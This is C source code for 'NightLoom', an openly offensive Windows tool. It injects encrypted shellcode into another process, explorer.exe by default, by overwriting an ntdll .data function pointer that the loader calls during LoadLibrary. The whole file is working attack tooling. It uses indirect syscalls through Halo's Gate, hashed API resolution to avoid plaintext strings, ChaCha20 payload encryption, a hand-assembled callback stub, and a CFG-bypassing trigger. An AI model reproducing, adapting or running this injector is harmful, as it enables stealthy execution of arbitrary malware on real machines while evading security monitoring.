/*
 * NightLoom — Cross-process Injection via Ldr Activation Context Callback
 *
 * Overwrites a function pointer stored in ntdll's writable .data section
 * that the Ldr calls through a fothk trampoline (JMP RAX) during every
 * LoadLibrary operation. No CFG validation on the dispatch path.
 *
 * Features:
 *   - ChaCha20 encrypted payload (decrypted in-target just before exec)
 *   - RW → RX memory (no RWX pages)
 *   - Halo's Gate indirect syscalls (7 syscalls, SSN resolved at runtime)
 *   - CRC32B hash-based API resolution (no plaintext strings)
 *   - Loader Lock safe (CreateThread dispatch)
 *   - Self-cleaning stub (restores original pointer)
 */

#include "Common.h"
#include "HalosGate.h"
#include "PebResolver.h"
#include "MemReadGadget.h"
#include "ChaCha20.h"

#include <TlHelp32.h>
#include <bcrypt.h>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "bcrypt.lib")

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _CTX_GLOBAL {
    SYSCALL_ENTRY NtOpenProcess;
    SYSCALL_ENTRY NtAllocateVirtualMemory;
    SYSCALL_ENTRY NtWriteVirtualMemory;
    SYSCALL_ENTRY NtReadVirtualMemory;
    SYSCALL_ENTRY NtProtectVirtualMemory;
    SYSCALL_ENTRY NtClose;
    SYSCALL_ENTRY NtQueryVirtualMemory;
} CTX_GLOBAL, *PCTX_GLOBAL;

typedef struct _CTX_TARGET {
    DWORD     dwPid;
    HANDLE    hProcess;
    PVOID     pSlotRemote;
    ULONG_PTR ulOrigValue;
    PVOID     pRemoteBase;
    SIZE_T    cbAlloc;
} CTX_TARGET, *PCTX_TARGET;

static CTX_GLOBAL g_Api = { 0 };

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// PIC decrypt parameters — passed to DecryptAndRun as lpParameter
// Layout must match the offsets used by the PIC blob
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _DECRYPT_PARAMS {
    ULONG_PTR pfnVirtualProtect;    // +0x00
    ULONG_PTR pBase;                // +0x08 (allocation base)
    SIZE_T    cbAlloc;              // +0x10
    ULONG_PTR pPayload;            // +0x18
    DWORD     cbPayload;            // +0x20
    DWORD     _pad0;                // +0x24
    ULONG_PTR pTrampoline;         // +0x28
    BYTE      key[32];              // +0x30
    BYTE      nonce[12];            // +0x50
    DWORD     _pad1;                // +0x5C
} DECRYPT_PARAMS;                   // sizeof = 0x60

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// PIC DecryptAndRun — compiled into .nlpic section, copied to target
//
// This function runs in a new thread in the TARGET process.
// It decrypts the ChaCha20-encrypted payload, flips memory to RX,
// and calls the payload through an alignment trampoline.
//
// CONSTRAINTS (position-independent):
//   - No global/static data references (all constants as immediates)
//   - No CRT calls (no memcpy/memset — manual loops)
//   - No imports (VirtualProtect via function pointer in params)
//   - __declspec(safebuffers) to suppress stack cookie checks
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#pragma code_seg(".nlpic")
#pragma runtime_checks("", off)
#pragma optimize("gts", on)
#pragma strict_gs_check(off)

__declspec(safebuffers) __declspec(noinline)
static DWORD WINAPI DecryptAndRun(LPVOID lpParam)
{
    DECRYPT_PARAMS *p = (DECRYPT_PARAMS *)lpParam;

    typedef BOOL (WINAPI *FN_VP)(LPVOID, SIZE_T, DWORD, PDWORD);
    FN_VP fnVP = (FN_VP)p->pfnVirtualProtect;

    DWORD oldProt = 0;
    PBYTE pPayload = (PBYTE)p->pPayload;
    DWORD cbPayload = p->cbPayload;

    /* RX → RW: make payload writable for decryption */
    fnVP(pPayload, (SIZE_T)cbPayload, 0x04 /* PAGE_READWRITE */, &oldProt);

    /* ---- ChaCha20 decrypt in-place ---- */
    {
        unsigned int state[16], work[16];
        unsigned int i, j;

        state[ 0] = 0x61707865;
        state[ 1] = 0x3320646e;
        state[ 2] = 0x79622d32;
        state[ 3] = 0x6b206574;

        for (i = 0; i < 8; i++) {
            unsigned int v = 0;
            v |= (unsigned int)p->key[i * 4 + 0];
            v |= (unsigned int)p->key[i * 4 + 1] << 8;
            v |= (unsigned int)p->key[i * 4 + 2] << 16;
            v |= (unsigned int)p->key[i * 4 + 3] << 24;
            state[4 + i] = v;
        }

        state[12] = 0;

        for (i = 0; i < 3; i++) {
            unsigned int v = 0;
            v |= (unsigned int)p->nonce[i * 4 + 0];
            v |= (unsigned int)p->nonce[i * 4 + 1] << 8;
            v |= (unsigned int)p->nonce[i * 4 + 2] << 16;
            v |= (unsigned int)p->nonce[i * 4 + 3] << 24;
            state[13 + i] = v;
        }

        DWORD offset = 0;
        while (offset < cbPayload) {
            for (i = 0; i < 16; i++) work[i] = state[i];

            for (i = 0; i < 10; i++) {
                #define ROTL(v, n) (((v) << (n)) | ((v) >> (32 - (n))))
                #define QR(a, b, c, d) \
                    work[a]+=work[b]; work[d]^=work[a]; work[d]=ROTL(work[d],16); \
                    work[c]+=work[d]; work[b]^=work[c]; work[b]=ROTL(work[b],12); \
                    work[a]+=work[b]; work[d]^=work[a]; work[d]=ROTL(work[d], 8); \
                    work[c]+=work[d]; work[b]^=work[c]; work[b]=ROTL(work[b], 7);

                QR(0,4,8,12);  QR(1,5,9,13);  QR(2,6,10,14); QR(3,7,11,15);
                QR(0,5,10,15); QR(1,6,11,12); QR(2,7,8,13);  QR(3,4,9,14);

                #undef QR
                #undef ROTL
            }

            for (i = 0; i < 16; i++) work[i] += state[i];

            {
                unsigned int blen = cbPayload - offset;
                if (blen > 64) blen = 64;
                unsigned char *ks = (unsigned char *)work;
                for (j = 0; j < blen; j++)
                    pPayload[offset + j] ^= ks[j];
            }

            state[12]++;
            offset += 64;
        }
    }

    /* RW → RX: make payload executable */
    fnVP(pPayload, (SIZE_T)cbPayload, 0x20 /* PAGE_EXECUTE_READ */, &oldProt);

    /* Call payload through alignment trampoline */
    ((DWORD (WINAPI *)(LPVOID))p->pTrampoline)(NULL);

    return 0;
}

__declspec(noinline) static void DecryptAndRun_End(void) { }

#pragma code_seg()
#pragma runtime_checks("", restore)
#pragma optimize("", on)

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Phase 0: Initialize Halo's Gate
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL InitializeGate(void)
{
    HMODULE hNtdll = ResolveModuleByHash(CRC32B_NTDLLDLL);
    if (!hNtdll) {
        printf("[!] Failed to resolve ntdll\n");
        return FALSE;
    }

    if (!ScanReadGadgets(hNtdll, 0)) {
        printf("[!] Failed to find read gadgets\n");
        return FALSE;
    }

    struct { DWORD hash; PSYSCALL_ENTRY entry; const char *name; } tbl[] = {
        { CRC32B_NTOPENPROCESS,           &g_Api.NtOpenProcess,           "NtOpenProcess"           },
        { CRC32B_NTALLOCATEVIRTUALMEMORY, &g_Api.NtAllocateVirtualMemory, "NtAllocateVirtualMemory" },
        { CRC32B_NTWRITEVIRTUALMEMORY,    &g_Api.NtWriteVirtualMemory,    "NtWriteVirtualMemory"    },
        { CRC32B_NTREADVIRTUALMEMORY,     &g_Api.NtReadVirtualMemory,     "NtReadVirtualMemory"     },
        { CRC32B_NTPROTECTVIRTUALMEMORY,  &g_Api.NtProtectVirtualMemory,  "NtProtectVirtualMemory"  },
        { CRC32B_NTCLOSE,                 &g_Api.NtClose,                 "NtClose"                 },
        { CRC32B_NTQUERYVIRTUALMEMORY,    &g_Api.NtQueryVirtualMemory,    "NtQueryVirtualMemory"    },
    };

    for (int i = 0; i < _countof(tbl); i++) {
        if (!ResolveSyscallByHash(tbl[i].hash, tbl[i].entry)) {
            printf("[!] Failed to resolve %s\n", tbl[i].name);
            return FALSE;
        }
    }

    printf("[+] Halo's Gate: 7 syscalls resolved (indirect dispatch)\n");
    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Process finder
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static DWORD FindProcessByName(const WCHAR *name)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Phase 1: Locate the activation context pointer in ntdll .data
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static PVOID LocateActCtxSlot(OUT ULONG_PTR *pOrigValue)
{
    HMODULE hNtdll = ResolveModuleByHash(CRC32B_NTDLLDLL);
    HMODULE hK32 = ResolveModuleByHash(CRC32B_KERNEL32DLL);
    if (!hNtdll || !hK32) return NULL;

    ULONG_PTR ntBase = (ULONG_PTR)hNtdll;
    ULONG_PTR k32Base = (ULONG_PTR)hK32;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(ntBase + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    ULONG_PTR dataVA = 0;
    DWORD dataSize = 0;
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSec[i].Name, ".data", 5) == 0) {
            dataVA = ntBase + pSec[i].VirtualAddress;
            dataSize = pSec[i].Misc.VirtualSize;
            break;
        }
    }
    if (!dataVA) return NULL;

    PIMAGE_DOS_HEADER pDos2 = (PIMAGE_DOS_HEADER)hK32;
    PIMAGE_NT_HEADERS pNt2 = (PIMAGE_NT_HEADERS)(k32Base + pDos2->e_lfanew);
    ULONG_PTR k32End = k32Base + pNt2->OptionalHeader.SizeOfImage;

    printf("[*] ntdll .data: 0x%p (size 0x%lX)\n", (PVOID)dataVA, dataSize);
    printf("[*] kernel32:    0x%p - 0x%p\n", (PVOID)k32Base, (PVOID)k32End);

    /* fothk pattern scan — fully dynamic, works on any Windows build */
    ULONG_PTR fothkVA = 0;
    DWORD fothkSize = 0;
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSec[i].Name, "fothk", 5) == 0) {
            fothkVA = ntBase + pSec[i].VirtualAddress;
            fothkSize = pSec[i].Misc.VirtualSize;
            break;
        }
    }

    ULONG_PTR textVA = 0;
    DWORD textSize = 0;
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if ((pSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            pSec[i].Misc.VirtualSize > textSize) {
            textVA = ntBase + pSec[i].VirtualAddress;
            textSize = pSec[i].Misc.VirtualSize;
        }
    }

    if (!fothkVA || !textVA) {
        printf("[!] Cannot find fothk or .text section\n");
        return NULL;
    }

    printf("[*] Scanning .text for fothk-dispatched .data pointers...\n");

    for (ULONG_PTR pc = textVA; pc + 12 < textVA + textSize; pc++) {
        PBYTE b = (PBYTE)pc;
        if (b[0] != 0x48 || b[1] != 0x8B || b[2] != 0x05) continue;

        INT32 disp = *(INT32*)(b + 3);
        ULONG_PTR dataTarget = pc + 7 + disp;

        if (dataTarget < dataVA || dataTarget >= dataVA + dataSize) continue;

        ULONG_PTR val = *(ULONG_PTR*)dataTarget;
        if (val < k32Base || val >= k32End) continue;

        for (int j = 7; j < 48 && pc + j + 5 < textVA + textSize; j++) {
            if (b[j] != 0xE8) continue;
            INT32 callDisp = *(INT32*)(b + j + 1);
            ULONG_PTR callTarget = pc + j + 5 + callDisp;
            if (callTarget >= fothkVA && callTarget < fothkVA + fothkSize) {
                DWORD dataOff = (DWORD)(dataTarget - dataVA);
                printf("[+] .data+0x%04lX -> kernel32+0x%llX (fothk at ntdll+0x%llX)\n",
                       dataOff,
                       (unsigned long long)(val - k32Base),
                       (unsigned long long)(pc - ntBase));

                PBYTE pFothk = (PBYTE)callTarget;
                if (pFothk[0] == 0xE9) {
                    INT32 jmpDisp = *(INT32*)(pFothk + 1);
                    PBYTE pJmpTarget = pFothk + 5 + jmpDisp;
                    if (pJmpTarget[0] == 0x48 && pJmpTarget[1] == 0xFF &&
                        pJmpTarget[2] == 0xE0) {
                        printf("[+] Confirmed: fothk -> JMP RAX (no CFG)\n");
                        *pOrigValue = val;
                        return (PVOID)dataTarget;
                    }
                }
            }
        }
    }

    printf("[!] Could not locate activation context slot\n");
    return NULL;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Phase 2: Open target process via indirect syscall
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL OpenTarget(PCTX_TARGET ctx)
{
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    CLIENT_ID cid = { .UniqueProcess = (HANDLE)(ULONG_PTR)ctx->dwPid };

    GATE_PREPARE(g_Api.NtOpenProcess);
    NTSTATUS status = GATE_CALL(
        &ctx->hProcess,
        (ACCESS_MASK)(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE),
        &oa,
        &cid
    );

    if (!NT_SUCCESS(status)) {
        printf("[!] NtOpenProcess failed: 0x%08lX\n", status);
        return FALSE;
    }

    printf("[+] Process handle: 0x%p\n", ctx->hProcess);
    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Phase 3: Verify remote pointer matches local
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL VerifyRemoteSlot(PCTX_TARGET ctx)
{
    ULONG_PTR remoteVal = 0;
    SIZE_T cbRead = 0;

    GATE_PREPARE(g_Api.NtReadVirtualMemory);
    NTSTATUS status = GATE_CALL(
        ctx->hProcess,
        ctx->pSlotRemote,
        &remoteVal,
        (SIZE_T)8,
        &cbRead
    );

    if (!NT_SUCCESS(status)) {
        printf("[!] NtReadVirtualMemory failed: 0x%08lX\n", status);
        return FALSE;
    }

    printf("[+] Remote slot: 0x%p\n", (PVOID)remoteVal);

    if (remoteVal != ctx->ulOrigValue) {
        printf("[!] Remote value differs from local -- using remote value\n");
        ctx->ulOrigValue = remoteVal;
    }

    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Phase 4: Build + inject (ChaCha20 encrypted payload)
//
// Memory layout in target:
//   [0x000] Callback stub      — fires under Loader Lock
//   [0x077] Trampoline         — alignment wrapper for shellcode
//   [0x088] DECRYPT_PARAMS     — key, nonce, addresses for PIC blob
//   [0x0E8] DecryptAndRun blob — PIC ChaCha20 decryptor from .nlpic
//   [blob+] Encrypted payload  — ChaCha20 ciphertext
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define CALLBACK_STUB_SIZE 0x77
#define TRAMP_SIZE         15
#define TRAMP_OFF          0x77
#define PARAMS_OFF         0x88

static BOOL InjectShellcode(PCTX_TARGET ctx, PBYTE pPayload, DWORD cbPayload)
{
    /* Resolve APIs via hash */
    HMODULE hK32 = ResolveModuleByHash(CRC32B_KERNEL32DLL);
    FARPROC pCreateThread = ResolveProcByHash(hK32, CRC32B_CREATETHREAD);
    FARPROC pVirtualProtect = ResolveProcByHash(hK32, CRC32B_VIRTUALPROTECT);
    if (!pCreateThread || !pVirtualProtect) {
        printf("[!] Cannot resolve CreateThread/VirtualProtect\n");
        return FALSE;
    }
    printf("[*] CreateThread:    0x%p\n", pCreateThread);
    printf("[*] VirtualProtect:  0x%p\n", pVirtualProtect);

    /* Get PIC decrypt blob from .nlpic section of our own PE */
    PVOID pBlobSrc = (PVOID)DecryptAndRun;
    DWORD cbBlob = (DWORD)((ULONG_PTR)DecryptAndRun_End - (ULONG_PTR)DecryptAndRun);
    printf("[*] PIC decrypt blob: %lu bytes\n", cbBlob);

    /* Compute layout offsets */
    DWORD blobOff = PARAMS_OFF + sizeof(DECRYPT_PARAMS);
    blobOff = (blobOff + 15) & ~15;   /* align to 16 */
    DWORD payloadOff = blobOff + cbBlob;
    payloadOff = (payloadOff + 15) & ~15;
    DWORD cbTotal = payloadOff + cbPayload;

    printf("[*] Layout: stub=0x000 tramp=0x%03X params=0x%03X blob=0x%03X payload=0x%03X total=%lu\n",
           TRAMP_OFF, PARAMS_OFF, blobOff, payloadOff, cbTotal);

    /* Generate random ChaCha20 key + nonce */
    BYTE key[32], nonce[12];
    NTSTATUS bcStatus = BCryptGenRandom(NULL, key, sizeof(key),
                                         BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    if (bcStatus != 0) {
        printf("[!] BCryptGenRandom (key) failed: 0x%08lX\n", bcStatus);
        return FALSE;
    }
    bcStatus = BCryptGenRandom(NULL, nonce, sizeof(nonce),
                                BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    if (bcStatus != 0) {
        printf("[!] BCryptGenRandom (nonce) failed: 0x%08lX\n", bcStatus);
        return FALSE;
    }
    printf("[+] ChaCha20 key/nonce generated (%d + %d bytes)\n",
           (int)sizeof(key), (int)sizeof(nonce));

    /* Encrypt a copy of the payload */
    PBYTE pEncPayload = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPayload);
    if (!pEncPayload) return FALSE;
    memcpy(pEncPayload, pPayload, cbPayload);
    ChaCha20_Crypt(pEncPayload, cbPayload, key, nonce, 0);
    printf("[+] Payload encrypted with ChaCha20\n");

    /* Build the full buffer */
    PBYTE pBuf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbTotal);
    if (!pBuf) {
        HeapFree(GetProcessHeap(), 0, pEncPayload);
        return FALSE;
    }

    /* ---- Callback stub (fires under Loader Lock) ---- */
    BYTE callbackStub[CALLBACK_STUB_SIZE] = {
        /* Save volatile registers */
        0x50,                                           /* 00: push rax         */
        0x51,                                           /* 01: push rcx         */
        0x52,                                           /* 02: push rdx         */
        0x41, 0x50,                                     /* 03: push r8          */
        0x41, 0x51,                                     /* 05: push r9          */
        0x41, 0x52,                                     /* 07: push r10         */
        0x41, 0x53,                                     /* 09: push r11         */
        0x48, 0x83, 0xEC, 0x30,                         /* 0B: sub rsp, 0x30   */

        /* Restore original .data pointer */
        0x48, 0xB8, 0,0,0,0,0,0,0,0,                   /* 0F: mov rax, <slot>  */
        0x48, 0xB9, 0,0,0,0,0,0,0,0,                   /* 19: mov rcx, <orig>  */
        0x48, 0x89, 0x08,                               /* 23: mov [rax], rcx   */

        /* CreateThread(NULL, 0, DecryptAndRun, pParams, 0, NULL) */
        0x31, 0xC9,                                     /* 26: xor ecx, ecx     */
        0x31, 0xD2,                                     /* 28: xor edx, edx     */
        0x49, 0xB8, 0,0,0,0,0,0,0,0,                   /* 2A: mov r8, <blob>   */
        0x49, 0xB9, 0,0,0,0,0,0,0,0,                   /* 34: mov r9, <params> */
        0x48, 0xC7, 0x44, 0x24, 0x20, 0,0,0,0,         /* 3E: [rsp+20] = 0    */
        0x48, 0xC7, 0x44, 0x24, 0x28, 0,0,0,0,         /* 47: [rsp+28] = 0    */
        0x48, 0xB8, 0,0,0,0,0,0,0,0,                   /* 50: mov rax, <CT>   */
        0xFF, 0xD0,                                     /* 5A: call rax         */

        /* Restore registers */
        0x48, 0x83, 0xC4, 0x30,                         /* 5C: add rsp, 0x30   */
        0x41, 0x5B,                                     /* 60: pop r11          */
        0x41, 0x5A,                                     /* 62: pop r10          */
        0x41, 0x59,                                     /* 64: pop r9           */
        0x41, 0x58,                                     /* 66: pop r8           */
        0x5A,                                           /* 68: pop rdx          */
        0x59,                                           /* 69: pop rcx          */
        0x58,                                           /* 6A: pop rax          */

        /* Tail-call original function */
        0x48, 0xB8, 0,0,0,0,0,0,0,0,                   /* 6B: mov rax, <orig>  */
        0xFF, 0xE0,                                     /* 75: jmp rax          */
    };

    memcpy(pBuf, callbackStub, CALLBACK_STUB_SIZE);

    /* ---- Alignment trampoline ---- */
    BYTE trampoline[TRAMP_SIZE] = {
        0x48, 0xB8, 0,0,0,0,0,0,0,0,                   /* mov rax, <payload>   */
        0xFF, 0xD0,                                     /* call rax             */
        0x31, 0xC0,                                     /* xor eax, eax         */
        0xC3,                                           /* ret                  */
    };
    memcpy(pBuf + TRAMP_OFF, trampoline, TRAMP_SIZE);

    /* ---- DecryptAndRun PIC blob ---- */
    memcpy(pBuf + blobOff, pBlobSrc, cbBlob);

    /* ---- Encrypted payload ---- */
    memcpy(pBuf + payloadOff, pEncPayload, cbPayload);
    HeapFree(GetProcessHeap(), 0, pEncPayload);

    /* ---- Allocate RW in target ---- */
    PVOID pRemote = NULL;
    SIZE_T cbAlloc = (SIZE_T)cbTotal;

    GATE_PREPARE(g_Api.NtAllocateVirtualMemory);
    NTSTATUS status = GATE_CALL(
        ctx->hProcess, &pRemote, (ULONG_PTR)0, &cbAlloc,
        (ULONG)(MEM_COMMIT | MEM_RESERVE),
        (ULONG)PAGE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        printf("[!] NtAllocateVirtualMemory failed: 0x%08lX\n", status);
        HeapFree(GetProcessHeap(), 0, pBuf);
        return FALSE;
    }

    printf("[+] Allocated RW: 0x%p (%llu bytes)\n", pRemote, (unsigned long long)cbAlloc);

    /* ---- Patch addresses (now that we know pRemote) ---- */

    /* Callback stub patches */
    *(ULONG_PTR*)(pBuf + 0x11) = (ULONG_PTR)ctx->pSlotRemote;
    *(ULONG_PTR*)(pBuf + 0x1B) = ctx->ulOrigValue;
    *(ULONG_PTR*)(pBuf + 0x2C) = (ULONG_PTR)pRemote + blobOff;    /* DecryptAndRun */
    *(ULONG_PTR*)(pBuf + 0x36) = (ULONG_PTR)pRemote + PARAMS_OFF; /* params */
    *(ULONG_PTR*)(pBuf + 0x52) = (ULONG_PTR)pCreateThread;
    *(ULONG_PTR*)(pBuf + 0x6D) = ctx->ulOrigValue;

    /* Trampoline: patch payload address */
    *(ULONG_PTR*)(pBuf + TRAMP_OFF + 2) = (ULONG_PTR)pRemote + payloadOff;

    /* DECRYPT_PARAMS struct */
    DECRYPT_PARAMS *pParams = (DECRYPT_PARAMS *)(pBuf + PARAMS_OFF);
    pParams->pfnVirtualProtect = (ULONG_PTR)pVirtualProtect;
    pParams->pBase = (ULONG_PTR)pRemote;
    pParams->cbAlloc = cbAlloc;
    pParams->pPayload = (ULONG_PTR)pRemote + payloadOff;
    pParams->cbPayload = cbPayload;
    pParams->pTrampoline = (ULONG_PTR)pRemote + TRAMP_OFF;
    memcpy(pParams->key, key, 32);
    memcpy(pParams->nonce, nonce, 12);

    /* ---- Write to target ---- */
    SIZE_T cbWritten = 0;
    GATE_PREPARE(g_Api.NtWriteVirtualMemory);
    status = GATE_CALL(
        ctx->hProcess, pRemote, pBuf,
        (SIZE_T)cbTotal, &cbWritten
    );

    HeapFree(GetProcessHeap(), 0, pBuf);

    if (!NT_SUCCESS(status)) {
        printf("[!] NtWriteVirtualMemory failed: 0x%08lX\n", status);
        return FALSE;
    }

    printf("[+] Written %llu bytes (stub + tramp + params + blob + encrypted payload)\n",
           (unsigned long long)cbWritten);

    /* ---- Flip RW -> RX ---- */
    {
        PVOID pProtect = pRemote;
        SIZE_T cbProtect = cbAlloc;
        ULONG ulOldProtect = 0;

        GATE_PREPARE(g_Api.NtProtectVirtualMemory);
        status = GATE_CALL(
            ctx->hProcess, &pProtect, &cbProtect,
            (ULONG)PAGE_EXECUTE_READ, &ulOldProtect
        );

        if (!NT_SUCCESS(status)) {
            printf("[!] NtProtectVirtualMemory (RW->RX) failed: 0x%08lX\n", status);
            return FALSE;
        }

        printf("[+] Protection: RW -> RX\n");
    }

    ctx->pRemoteBase = pRemote;
    ctx->cbAlloc = cbAlloc;

    /* Zero key material from injector memory */
    SecureZeroMemory(key, sizeof(key));
    SecureZeroMemory(nonce, sizeof(nonce));

    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Phase 5: Overwrite the .data pointer -> arm the trigger
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL ArmTrigger(PCTX_TARGET ctx)
{
    ULONG_PTR newVal = (ULONG_PTR)ctx->pRemoteBase;
    SIZE_T cbWritten = 0;

    printf("[*] Overwriting .data pointer:\n");
    printf("    0x%p -> 0x%p\n", (PVOID)ctx->ulOrigValue, (PVOID)newVal);

    GATE_PREPARE(g_Api.NtWriteVirtualMemory);
    NTSTATUS status = GATE_CALL(
        ctx->hProcess, ctx->pSlotRemote, &newVal,
        (SIZE_T)sizeof(newVal), &cbWritten
    );

    if (!NT_SUCCESS(status)) {
        printf("[!] NtWriteVirtualMemory (.data slot) failed: 0x%08lX\n", status);
        return FALSE;
    }

    printf("[+] Pointer overwritten -- trigger armed\n");
    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Entry point
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

int wmain(int argc, WCHAR **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    g_bVerbose = TRUE;

    printf("\n");
    printf("  +------------------------------------------------------------+\n");
    printf("  |  NightLoom                                                 |\n");
    printf("  |  Ldr Activation Context Callback Injection                 |\n");
    printf("  |  .data fptr -> fothk JMP RAX (no CFG) | ChaCha20 payload  |\n");
    printf("  +------------------------------------------------------------+\n");
    printf("\n");

    if (argc < 2) {
        printf("  Usage: NightLoom.exe <shellcode.bin> [target]\n");
        printf("         target = PID (numeric) or process name\n");
        printf("         default target: explorer.exe\n\n");
        return 1;
    }

    /* Read shellcode file */
    HANDLE hFile = CreateFileW(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Cannot open shellcode: %ls\n", argv[1]);
        return 1;
    }
    DWORD cbPayload = GetFileSize(hFile, NULL);
    PBYTE pPayload = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPayload);
    DWORD dwRead;
    ReadFile(hFile, pPayload, cbPayload, &dwRead, NULL);
    CloseHandle(hFile);
    printf("[+] Shellcode: %ls (%lu bytes)\n", argv[1], cbPayload);

    /* Resolve target */
    CTX_TARGET ctx = { 0 };
    if (argc >= 3) {
        WCHAR *endp = NULL;
        DWORD tmp = (DWORD)wcstoul(argv[2], &endp, 10);
        if (endp && *endp == L'\0')
            ctx.dwPid = tmp;
        else
            ctx.dwPid = FindProcessByName(argv[2]);
    } else {
        ctx.dwPid = FindProcessByName(L"explorer.exe");
    }

    if (!ctx.dwPid) {
        printf("[!] Cannot find target process\n");
        return 1;
    }
    printf("[+] Target PID: %lu\n\n", ctx.dwPid);

    /* Phase 0 */
    printf("[*] Phase 0: Initializing Halo's Gate...\n");
    if (!InitializeGate()) return 1;

    /* Phase 1 */
    printf("\n[*] Phase 1: Locating activation context callback slot...\n");
    PVOID pSlot = LocateActCtxSlot(&ctx.ulOrigValue);
    if (!pSlot) {
        printf("[!] Failed to locate activation context slot\n");
        return 1;
    }
    ctx.pSlotRemote = pSlot;

    /* Phase 2 */
    printf("\n[*] Phase 2: Opening target process...\n");
    if (!OpenTarget(&ctx)) return 1;

    /* Phase 3 */
    printf("\n[*] Phase 3: Verifying remote pointer...\n");
    if (!VerifyRemoteSlot(&ctx)) return 1;

    /* Phase 4 */
    printf("\n[*] Phase 4: Injecting (ChaCha20 encrypted)...\n");
    if (!InjectShellcode(&ctx, pPayload, cbPayload)) return 1;

    /* Phase 5 */
    printf("\n[*] Phase 5: Arming trigger...\n");
    if (!ArmTrigger(&ctx)) return 1;

    /* Cleanup */
    GATE_PREPARE(g_Api.NtClose);
    GATE_CALL(ctx.hProcess);

    HeapFree(GetProcessHeap(), 0, pPayload);

    printf("\n[+] Injection complete!\n");
    printf("[*] Trigger: next LoadLibrary call in PID %lu\n", ctx.dwPid);
    printf("[*] Payload is ChaCha20 encrypted in target memory\n");
    printf("[*] Decryption + execution happens in a new thread (Loader Lock safe)\n");
    printf("[*] Stub auto-restores original pointer -- process stays stable\n\n");

    return 0;
}
